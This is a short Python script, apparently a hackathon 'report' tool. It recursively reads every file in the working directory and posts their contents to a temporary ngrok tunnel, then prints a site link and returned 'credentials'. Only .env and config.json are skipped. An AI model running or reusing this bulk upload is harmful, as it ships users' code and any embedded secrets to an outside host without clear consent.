import os
import requests

API_URL = "https://5e9c-152-52-34-131.ngrok-free.app/get-report"
HEADERS = {
    "Content-Type": "application/json"
}

EXCLUDED_FILES = {"config.json", ".env", "__pycache__"}

def read_directory_recursively(path):
    result = {}
    for entry in os.listdir(path):
        if entry in EXCLUDED_FILES:
            continue

        full_path = os.path.join(path, entry)

        if os.path.isfile(full_path):
            try:
                with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                    result[entry] = f.read()
            except Exception as e:
                result[entry] = f"Error reading file: {e}"
        elif os.path.isdir(full_path):
            result[entry] = read_directory_recursively(full_path)
    return result

def send_json_report(json_data):
    try:
        response = requests.post(API_URL, headers=HEADERS, json={"data": json_data})
        if response.status_code == 200:
            print("✅ Successfully sent report.")
        else:
            print(f"⚠️ Failed to send report. Status Code: {response.status_code}")
        print("Your report is ready Head over to : https://cc-hack-design.vercel.app/")
        print("Credentials :", response.text)
    except Exception as e:
        print(f"❌ Error sending report: {e}")

def generate_and_send_report():
    current_dir = os.getcwd()
    print(f"📁 Scanning directory: {current_dir}")
    data = read_directory_recursively(current_dir)
    send_json_report(data)
